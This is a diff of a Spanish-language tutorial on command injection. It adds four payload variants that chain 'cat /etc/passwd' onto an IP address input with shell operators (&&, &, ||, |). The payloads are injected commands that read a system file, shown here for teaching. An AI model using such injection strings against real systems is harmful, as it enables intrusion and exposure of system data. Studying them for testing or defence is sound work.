@@ -24,7 +24,24 @@ Una vez que se encontró la vulnerabilidad `in-band` o `blind` se procede a expl
 
 ````py
 ## Concatena 127.0.0.1 + cat /etc/passwd + (concatena lo que sigue en el comando original con un &)
+
+### Opción 1:
 127.0.0.1 && cat /etc/passwd &
+
+### Opción 2:
+127.0.0.1 & cat /etc/passwd &
+
+### Opción 3:
+127.0.0.1 || cat /etc/passwd &
+
+### Opción 4:
+127.0.0.1 | cat /etc/passwd &
+
+.
+.
+.
+
+etc
 
 ````
 
